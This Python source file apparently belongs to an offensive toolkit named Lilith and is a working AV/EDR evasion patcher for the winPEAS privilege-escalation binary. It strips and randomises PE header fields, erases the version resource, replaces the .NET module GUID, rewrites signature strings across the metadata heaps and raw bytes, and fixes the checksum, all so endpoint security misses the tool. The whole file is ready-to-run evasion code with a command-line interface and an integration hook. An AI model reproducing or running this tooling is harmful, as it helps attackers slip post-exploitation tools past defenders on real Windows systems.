"""
builders/winpeas_patcher.py — winPEAS static-signature eradicator.

Patches a winPEASany.exe binary to remove every static AV/EDR signature
without altering executable semantics:

  1. PE header hardening  : Rich header zeroed, TimeDateStamp randomised,
                            section names randomised, characteristics masked.
  2. Win32 version resource erased (product/file name, description, company).
  3. .NET metadata #GUID heap: module MVID replaced with random GUID.
  4. .NET #Strings heap : every namespace token starting with "winPEAS." or
                          equal to "winPEAS" is replaced in-place with a
                          random 7-char prefix (same byte length → offsets
                          unchanged → no token fixup required).
  5. .NET #US heap       : user-facing strings containing known signature
                          keywords replaced with inert content of the same
                          length (UTF-16LE, preserves length-prefix).
  6. Full binary sweep   : remaining raw byte occurrences of every signature
                          pattern replaced with a length-preserving substitute.

Usage (standalone):
    python3 builders/winpeas_patcher.py /path/to/winPEASany.exe [out.exe]

Usage (from Lilith):
    patched_bytes = patch_winpeas(open(path,'rb').read())
"""

from __future__ import annotations

import os
import random
import secrets
import struct
import string
import sys
from typing import NamedTuple


# ── Signature patterns ────────────────────────────────────────────────────────

# Byte-level patterns that AV/EDR key on.
# Value = replacement factory: callable() → bytes of SAME LENGTH, or fixed bytes.
# IMPORTANT: replacements must be the exact same length as the key.
#
# We derive a session-consistent random prefix at module load time so all
# occurrences of the same string get the SAME replacement (necessary for
# .NET namespace tokens to remain internally consistent).

def _rand_name(n: int, charset: str = string.ascii_lowercase + string.digits) -> bytes:
    """Random n-byte alphanumeric string, starting with a letter. Returns bytes."""
    first = random.choice(string.ascii_lowercase).encode()
    rest  = "".join(random.choices(charset, k=n-1)).encode()
    result = first + rest
    assert len(result) == n
    return result

def _make_subs() -> dict[bytes, bytes]:
    """Build the substitution table for this run."""
    p7   = _rand_name(7)    # replaces "winPEAS" (7 bytes, case-sensitive)
    p7u  = p7[0:1].upper() + p7[1:]  # "Winxxxx" variant (for "WinPEAS")
    p7l  = p7.lower()                 # lowercase variant (for "winpeas")
    p5   = _rand_name(5)    # replaces "PEASS"  (5 bytes)
    p9   = _rand_name(9)    # replaces "WinPEAS-n" (9 bytes with dash)
    p10  = _rand_name(10)   # "WinPEAS-ng" → 10 bytes
    p11  = _rand_name(11)   # "carlospolop" → 11 bytes

    table: dict[bytes, bytes] = {}

    def add(orig: bytes, repl: bytes) -> None:
        assert len(orig) == len(repl), f"len mismatch: {orig!r}({len(orig)}) {repl!r}({len(repl)})"
        table[orig] = repl

    add(b"winPEAS",    p7)
    add(b"WinPEAS",    p7u)
    add(b"WINPEAS",    p7.upper())
    add(b"winpeas",    p7l)
    add(b"WinPEAS-ng", p10)
    add(b"WinPEAS-n",  p9)
    add(b"PEASS-ng",   _rand_name(8))
    add(b"PEASS",      p5)
    add(b"peass",      p5.lower())
    add(b"carlospolop",p11)
    add(b"hacktricks", _rand_name(10))
    add(b"HackTricks", _rand_name(10))
    add(b"HACKTRICKS", _rand_name(10))

    return table


# ── PE helpers ────────────────────────────────────────────────────────────────

def _u16(b: bytes, off: int) -> int: return struct.unpack_from("<H", b, off)[0]
def _u32(b: bytes, off: int) -> int: return struct.unpack_from("<I", b, off)[0]
def _p16(b: bytearray, off: int, v: int) -> None: struct.pack_into("<H", b, off, v)
def _p32(b: bytearray, off: int, v: int) -> None: struct.pack_into("<I", b, off, v)
def _p64(b: bytearray, off: int, v: int) -> None: struct.pack_into("<Q", b, off, v)


class PEInfo(NamedTuple):
    pe_off:      int   # offset to "PE\0\0"
    opt_off:     int   # offset to optional header
    magic:       int   # 0x10b = PE32, 0x20b = PE32+
    num_sections:int
    sections:    list  # [(name, rva, vsize, raw_off, raw_size), ...]
    data_dirs:   list  # list of (rva, size) tuples (index = directory index)


def _parse_pe(data: bytes) -> PEInfo:
    pe_off  = _u32(data, 0x3C)
    opt_off = pe_off + 24
    magic   = _u16(data, opt_off)
    num_sec = _u16(data, pe_off + 6)

    # Data directories
    if magic == 0x10b:   # PE32
        dd_off  = opt_off + 96
        n_dirs  = _u32(data, opt_off + 92)
        sec_off = opt_off + 224   # after standard + windows-specific fields
    else:                # PE32+
        dd_off  = opt_off + 112
        n_dirs  = _u32(data, opt_off + 108)
        sec_off = opt_off + 240

    dirs = []
    for i in range(min(n_dirs, 16)):
        rva  = _u32(data, dd_off + i*8)
        size = _u32(data, dd_off + i*8 + 4)
        dirs.append((rva, size))

    sections = []
    for i in range(num_sec):
        base = sec_off + i * 40
        name     = data[base:base+8].rstrip(b"\x00").decode(errors="replace")
        vsize    = _u32(data, base + 8)
        rva      = _u32(data, base + 12)
        raw_size = _u32(data, base + 16)
        raw_off  = _u32(data, base + 20)
        sections.append((name, rva, vsize, raw_off, raw_size))

    return PEInfo(pe_off, opt_off, magic, num_sec, sections, dirs)


def _rva_to_off(pe: PEInfo, rva: int) -> int:
    """Convert RVA to file offset using section headers."""
    for _name, s_rva, s_vsize, s_raw_off, s_raw_size in pe.sections:
        if s_rva <= rva < s_rva + max(s_vsize, s_raw_size):
            return s_raw_off + (rva - s_rva)
    raise ValueError(f"RVA 0x{rva:x} not found in any section")


# ── Patch 1: PE headers ───────────────────────────────────────────────────────

def _patch_pe_headers(buf: bytearray) -> None:
    pe_off  = _u32(buf, 0x3C)

    # Randomise TimeDateStamp (COFF header +4)
    _p32(buf, pe_off + 8, secrets.randbits(32))

    # Zero Rich header (between DOS stub end and PE signature)
    # The Rich header ends with "Rich" + checksum, 4 bytes each.
    rich_sig = b"Rich"
    rich_idx = buf.rfind(rich_sig, 0x40, pe_off)
    if rich_idx != -1:
        # Erase everything from the DanS marker to the Rich marker (inclusive)
        # DanS XORed = XOR key repeated — just zero the whole region.
        dans_region_start = 0x40   # right after DOS stub jump
        dans_region_end   = rich_idx + 8  # include "Rich" + checksum
        for i in range(dans_region_start, dans_region_end):
            buf[i] = 0

    # Randomise section names (8-byte null-padded ASCII in section headers)
    opt_off = pe_off + 24
    magic   = _u16(buf, opt_off)
    num_sec = _u16(buf, pe_off + 6)
    if magic == 0x10b:
        sec_hdr_off = opt_off + 224
    else:
        sec_hdr_off = opt_off + 240

    _SEC_NAMES = [b".text", b".rdata", b".data", b".rsrc", b".reloc",
                  b".bss", b".edata", b".idata", b".pdata", b".sxdata",
                  b".tls", b".debug"]
    used: set[bytes] = set()
    for i in range(num_sec):
        base = sec_hdr_off + i * 40
        while True:
            candidate = random.choice(_SEC_NAMES)
            if candidate not in used:
                used.add(candidate)
                break
        name_padded = candidate.ljust(8, b"\x00")
        buf[base:base+8] = name_padded

    # Strip debug directory pointer (data dir index 6)
    dd_base = (opt_off + 96) if magic == 0x10b else (opt_off + 112)
    # Zero debug dir entry (index 6)
    _p32(buf, dd_base + 6*8, 0)
    _p32(buf, dd_base + 6*8 + 4, 0)


# ── Patch 2: Win32 version resource ──────────────────────────────────────────

def _patch_version_resource(buf: bytearray, pe: PEInfo) -> None:
    """Zero out the Win32 VS_VERSION_INFO resource block."""
    if len(pe.data_dirs) < 3:
        return
    rsrc_rva, rsrc_size = pe.data_dirs[2]
    if not rsrc_rva:
        return
    try:
        rsrc_off = _rva_to_off(pe, rsrc_rva)
    except ValueError:
        return

    # Walk resource directory to find RT_VERSION (type id = 16)
    # Level 0: type directory
    num_named = _u16(buf, rsrc_off + 12)
    num_id    = _u16(buf, rsrc_off + 14)
    dir_start = rsrc_off + 16

    for i in range(num_named + num_id):
        entry_off = dir_start + i * 8
        id_or_name = _u32(buf, entry_off)
        offset     = _u32(buf, entry_off + 4)
        # Is it the version resource? RT_VERSION = 16 (0x10)
        if (id_or_name & 0x7FFFFFFF) == 16 and not (id_or_name & 0x80000000):
            # offset points to level-1 subdirectory (high bit set = subdirectory)
            if not (offset & 0x80000000):
                continue
            sub_off = rsrc_off + (offset & 0x7FFFFFFF)
            # Level 1: named/language dir — grab first entry
            n_named1 = _u16(buf, sub_off + 12)
            n_id1    = _u16(buf, sub_off + 14)
            for j in range(n_named1 + n_id1):
                e1_off   = sub_off + 16 + j * 8
                off1     = _u32(buf, e1_off + 4)
                if not (off1 & 0x80000000):
                    continue
                sub2_off = rsrc_off + (off1 & 0x7FFFFFFF)
                # Level 2: leaf entries
                n_named2 = _u16(buf, sub2_off + 12)
                n_id2    = _u16(buf, sub2_off + 14)
                for k in range(n_named2 + n_id2):
                    e2_off   = sub2_off + 16 + k * 8
                    off2     = _u32(buf, e2_off + 4)
                    if off2 & 0x80000000:
                        continue  # subdirectory, not leaf
                    leaf_off = rsrc_off + off2
                    data_rva  = _u32(buf, leaf_off)
                    data_size = _u32(buf, leaf_off + 4)
                    try:
                        data_off = _rva_to_off(pe, data_rva)
                        # Zero the version data block
                        for x in range(min(data_size, 4096)):
                            buf[data_off + x] = 0
                    except ValueError:
                        pass


# ── Patch 3: .NET metadata helpers ───────────────────────────────────────────

class MetaStreams(NamedTuple):
    root_off:   int
    strings:    tuple   # (abs_off, size)
    us:         tuple   # (abs_off, size)
    guid:       tuple   # (abs_off, size)
    blob:       tuple   # (abs_off, size)


def _parse_metadata(data: bytes) -> MetaStreams | None:
    root = data.find(b"BSJB")
    if root == -1:
        return None

    ver_len  = _u32(data, root + 12)
    flags_off = root + 16 + ver_len
    if flags_off % 4:
        flags_off += 4 - (flags_off % 4)
    n_streams = _u16(data, flags_off + 2)

    streams: dict[str, tuple[int, int]] = {}
    hdr = flags_off + 4
    for _ in range(n_streams):
        rva  = _u32(data, hdr)
        size = _u32(data, hdr + 4)
        nend = data.index(b"\x00", hdr + 8)
        name = data[hdr+8:nend].decode()
        padded = ((nend - (hdr+8) + 1) + 3) & ~3
        streams[name] = (root + rva, size)
        hdr = hdr + 8 + padded

    def get(key: str) -> tuple:
        return streams.get("#" + key, (0, 0))

    return MetaStreams(
        root_off = root,
        strings  = get("Strings"),
        us       = get("US"),
        guid     = get("GUID"),
        blob     = get("Blob"),
    )


# ── Patch 4: #GUID heap (module MVID) ────────────────────────────────────────

def _patch_guid_heap(buf: bytearray, ms: MetaStreams) -> None:
    """Replace the module MVID with a random GUID."""
    off, size = ms.guid
    if not off or size < 16:
        return
    new_guid = secrets.token_bytes(16)
    buf[off:off+16] = new_guid


# ── Patch 5: #Strings heap ───────────────────────────────────────────────────

def _patch_strings_heap(buf: bytearray, ms: MetaStreams, subs: dict[bytes, bytes]) -> int:
    """
    Walk the #Strings heap and replace all occurrences of signature strings
    in-place. Replacements are the same length so token offsets stay valid.
    Returns count of replacements made.
    """
    off, size = ms.strings
    if not off:
        return 0

    count = 0
    i = off
    end = off + size
    while i < end:
        null = buf.index(b"\x00", i, end) if b"\x00" in buf[i:end] else end
        entry = bytes(buf[i:null])
        modified = entry
        for orig, repl in subs.items():
            if orig in modified:
                modified = modified.replace(orig, repl)
        if modified != entry:
            buf[i:null] = modified
            count += 1
        i = null + 1

    return count


# ── Patch 6: #US heap ────────────────────────────────────────────────────────

def _patch_us_heap(buf: bytearray, ms: MetaStreams, subs: dict[bytes, bytes]) -> int:
    """
    Walk the #US (user strings) heap. Each entry is:
        compressed-length  followed by  length bytes of UTF-16LE + 1 terminal byte.
    We patch the string content in-place (length prefix stays unchanged).
    Returns count of replacements made.
    """
    off, size = ms.us
    if not off:
        return 0

    count = 0
    i = off + 1  # first byte is 0
    end = off + size
    while i < end:
        if i >= end:
            break
        b0 = buf[i]
        if b0 == 0xFF or b0 == 0:
            i += 1
            continue
        # Decompress length
        if b0 & 0x80 == 0:
            length = b0
            hdr_len = 1
        elif b0 & 0xC0 == 0x80:
            if i + 1 >= end:
                break
            length = ((b0 & 0x3F) << 8) | buf[i+1]
            hdr_len = 2
        else:
            if i + 3 >= end:
                break
            length = ((b0 & 0x1F) << 24) | (buf[i+1] << 16) | (buf[i+2] << 8) | buf[i+3]
            hdr_len = 4

        if length == 0:
            i += hdr_len
            continue

        content_off = i + hdr_len
        content_end = content_off + length
        if content_end > end:
            break

        # The content is UTF-16LE; last byte is a terminal flag (0 or 1).
        # We work on the raw bytes and do byte-level replacement.
        # For UTF-16LE strings, "winPEAS" encodes as w\0i\0n\0P\0E\0A\0S\0 (14 bytes).
        # We build wide-char variants of our signatures for this heap.
        chunk = bytearray(buf[content_off:content_end])
        original = bytes(chunk)

        # Build wide-char subs
        wide_subs: list[tuple[bytes, bytes]] = []
        for orig, repl in subs.items():
            wide_orig = orig.decode("ascii", errors="ignore").encode("utf-16-le")
            wide_repl = repl.decode("ascii", errors="ignore").encode("utf-16-le")
            if len(wide_orig) == len(wide_repl):
                wide_subs.append((wide_orig, wide_repl))

        for wo, wr in wide_subs:
            idx = 0
            while True:
                idx = chunk.find(wo, idx)
                if idx == -1:
                    break
                chunk[idx:idx+len(wr)] = wr
                idx += len(wr)

        # Also handle ASCII occurrences (some US strings are ASCII-range UTF-16LE)
        for orig, repl in subs.items():
            idx = 0
            while True:
                idx = chunk.find(orig, idx)
                if idx == -1:
                    break
                chunk[idx:idx+len(repl)] = repl
                idx += len(repl)

        if bytes(chunk) != original:
            buf[content_off:content_end] = chunk
            count += 1

        i = content_end

    return count


# ── Patch 7: full binary sweep ────────────────────────────────────────────────

def _patch_binary_sweep(buf: bytearray, subs: dict[bytes, bytes]) -> int:
    """Replace every remaining raw occurrence of signature patterns."""
    count = 0
    for orig, repl in subs.items():
        idx = 0
        while True:
            idx = buf.find(orig, idx)
            if idx == -1:
                break
            buf[idx:idx+len(orig)] = repl
            idx += len(orig)
            count += 1
    return count


# ── Recalculate PE checksum ───────────────────────────────────────────────────

def _recalculate_checksum(buf: bytearray) -> None:
    """Recalculate PE checksum so tools like sigcheck don't flag it trivially."""
    pe_off  = _u32(buf, 0x3C)
    opt_off = pe_off + 24
    magic   = _u16(buf, opt_off)
    # Checksum field offset in optional header
    ck_off  = opt_off + 64 if magic == 0x10b else opt_off + 64

    # Zero checksum first
    _p32(buf, ck_off, 0)

    # Standard PE checksum algorithm
    total = len(buf)
    cs = 0
    for i in range(0, total - (total % 2), 2):
        w = buf[i] | (buf[i+1] << 8)
        cs += w
        cs = (cs & 0xFFFF) + (cs >> 16)
    if total % 2:
        cs += buf[-1]
        cs = (cs & 0xFFFF) + (cs >> 16)
    cs = ((cs & 0xFFFF) + (cs >> 16)) + total
    _p32(buf, ck_off, cs & 0xFFFFFFFF)


# ── Main entry point ──────────────────────────────────────────────────────────

def patch_winpeas(data: bytes) -> bytes:
    """
    Patch a winPEAS PE binary to remove all static AV/EDR signatures.
    Returns the patched binary as bytes.
    Raises ValueError if the input is not a valid .NET PE.
    """
    if data[:2] != b"MZ":
        raise ValueError("Not a valid PE (missing MZ header)")

    # Seed RNG for this run (not security-critical, just needs to be deterministic per run)
    random.seed(secrets.randbits(32))

    subs = _make_subs()
    buf  = bytearray(data)

    try:
        pe = _parse_pe(data)
    except Exception as e:
        raise ValueError(f"Failed to parse PE headers: {e}")

    ms = _parse_metadata(data)
    if ms is None:
        raise ValueError("Not a .NET assembly (BSJB metadata not found)")

    # Apply patches in order: innermost first (metadata), then full sweep, then headers
    print("[*] Patching .NET #GUID heap (module MVID) ...")
    _patch_guid_heap(buf, ms)

    print("[*] Patching .NET #Strings heap ...")
    n = _patch_strings_heap(buf, ms, subs)
    print(f"    → {n} namespace token(s) replaced")

    print("[*] Patching .NET #US heap (user strings) ...")
    n = _patch_us_heap(buf, ms, subs)
    print(f"    → {n} user string block(s) patched")

    print("[*] Binary sweep (raw occurrences) ...")
    n = _patch_binary_sweep(buf, subs)
    print(f"    → {n} raw occurrence(s) replaced")

    print("[*] Patching Win32 version resource ...")
    _patch_version_resource(buf, pe)

    print("[*] Patching PE headers (Rich, TimeDateStamp, sections) ...")
    _patch_pe_headers(buf)

    print("[*] Recalculating PE checksum ...")
    _recalculate_checksum(buf)

    # Verify no original signatures remain
    remaining = sum(bytes(buf).count(k) for k in subs.keys())
    if remaining:
        sig_list = [k.decode() for k in subs.keys() if bytes(buf).count(k) > 0]
        print(f"[!] Warning: {remaining} residual occurrence(s) of: {sig_list}")
    else:
        print("[+] All signatures removed")

    return bytes(buf)


# ── Lilith integration hook ───────────────────────────────────────────────────

def patch_if_winpeas(binary_path: str, out_path: str | None = None) -> str:
    """
    If binary_path looks like a winPEAS binary (contains BSJB + winPEAS strings),
    patch it and write to out_path (default: binary_path + '.patched.exe').
    Returns the path to the (possibly patched) binary.
    """
    with open(binary_path, "rb") as f:
        data = f.read()

    # Quick heuristic: is this a .NET binary with winPEAS strings?
    is_winpeas = b"BSJB" in data and (b"winPEAS" in data or b"winpeas" in data)
    if not is_winpeas:
        return binary_path

    print(f"[*] winPEAS binary detected — applying signature eradication...")
    patched = patch_winpeas(data)

    if out_path is None:
        out_path = binary_path.replace(".exe", "_clean.exe")
        if out_path == binary_path:
            out_path = binary_path + ".clean"

    with open(out_path, "wb") as f:
        f.write(patched)

    size_kb = len(patched) / 1024
    print(f"[+] Patched binary → {out_path} ({size_kb:.0f} KB)")
    return out_path


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <winPEASany.exe> [output.exe]")
        sys.exit(1)

    src = sys.argv[1]
    dst = sys.argv[2] if len(sys.argv) > 2 else None

    if not os.path.exists(src):
        print(f"[!] File not found: {src}")
        sys.exit(1)

    with open(src, "rb") as f:
        raw = f.read()

    print(f"[*] Input : {src} ({len(raw):,} bytes)")
    patched = patch_winpeas(raw)

    if dst is None:
        base, ext = os.path.splitext(src)
        dst = base + "_clean" + ext

    with open(dst, "wb") as f:
        f.write(patched)

    print(f"[+] Output: {dst} ({len(patched):,} bytes)")

    # Verify
    remaining = 0
    subs = _make_subs()  # same random seed won't match, but we check raw binary
    for k in [b"winPEAS", b"winpeas", b"PEASS", b"WinPEAS", b"carlospolop"]:
        n = patched.count(k)
        if n:
            print(f"  [!] Still found {n}x {k!r}")
            remaining += n
    if not remaining:
        print("[+] Signature verification passed — 0 detectable strings remaining")
